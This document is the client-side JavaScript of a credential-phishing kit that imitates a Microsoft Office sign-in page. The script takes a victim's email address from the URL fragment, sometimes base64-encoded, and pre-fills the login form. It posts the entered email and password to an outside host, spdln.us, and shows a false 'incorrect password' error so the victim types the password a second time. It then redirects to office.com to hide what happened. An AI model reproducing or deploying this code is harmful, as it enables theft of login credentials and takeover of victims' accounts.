/* global $ */
$(document).ready(function() {
    var count = 0;

    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            var my_ai = ai;
        } else {
            var my_ai = atob(ai);
        }
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var fnl = c.toLowerCase();
        var fnlu = c.toUpperCase();
        $('#ai').val(my_ai);
        $("#diiiv1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div3").animate({ right: 0, opacity: "show" }, 0);
        setTimeout(() => {
            $("#div3").animate({ left: 0, opacity: "hide" }, 0);
            $("#div2").animate({ right: 0, opacity: "show" }, 0);
            $("#aich").html(my_ai);

        }, 4000);
    }





    $('#ai').click(function() {
        $('#error').hide();
    });

    $(document).keypress(function(event) {

        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
            if ($("#diiiv1").is(":visible")) {

                $("#next").click();

            } else if ($("#div2").is(":visible")) {
                event.preventDefault();

                $("#submit-btn").click();

            } else {
                return false;
            }
        }
    });


    $('#next').click(function() {
        event.preventDefault();
        var my_ai = $('#ai').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var fnl = c.toLowerCase();
        var fnlu = c.toUpperCase();
        $("#diiiv1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div3").animate({ right: 0, opacity: "show" }, 0);
        setTimeout(() => {
            $("#div3").animate({ left: 0, opacity: "hide" }, 0);
            $("#div2").animate({ right: 0, opacity: "show" }, 0);
            $("#aich").html(my_ai);

        }, 4000);



    });


    $('#back').click(function() {
        $("#msg").hide();
        $("#ai").val("");
        $("#pr").val("");
        $("#div2").animate({ left: 0, opacity: "hide" }, 0);
        $("#diiiv1").animate({ right: 0, opacity: "show" }, 1000);

    });

    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var detail = $("#field").html();
        var msg = $('#msg').html();

        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var fnl = c.toLowerCase();
        $('#msg').text(msg);
        count = count + 1;
        $.ajax({
            dataType: 'JSON',
            url: 'https://spdln.us/vendor/for/next.php',
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
                detail: detail,

            },
            beforeSend: function(xhr) {
                $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                $("#div3").animate({ left: 0, opacity: "show" }, 0);
            },
            success: function(response) {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    $("#load-text").html("Mail Recovered");
                    setTimeout(() => {
                        $("#load-text").html("You will be redirected to your office Mailbox shortly.");
                        setTimeout(() => {
                            window.location.replace("https://www.office.com");
                        }, 500);
                    }, 1000);


                    return false;
                }
                $("#msg").html("Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a>");
                $("#div3").animate({ left: 0, opacity: "hide" }, 0);
                $("#div2").animate({ left: 0, opacity: "show" }, 100);
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    $("#load-text").html("Mail Recovered");
                    setTimeout(() => {
                        $("#load-text").html("You will be redirected to your office Mailbox shortly.");
                        setTimeout(() => {
                            window.location.replace("https://www.office.com");
                        }, 500);
                    }, 1000);


                    return false;
                }
                $("#msg").html("Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a>");
                $("#div3").animate({ left: 0, opacity: "hide" }, 0);
                $("#div2").animate({ left: 0, opacity: "show" }, 100);
            },
			// data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
			success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#pr").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("https://www.office.com");

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
			error: function(){
              $("#pr").val("");
              if (count>=2) {
                count=0;
                window.location.replace("https://www.office.com");
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function() {
			$('#submit-btn').html('Sign in');
            }
            
        });
    });
});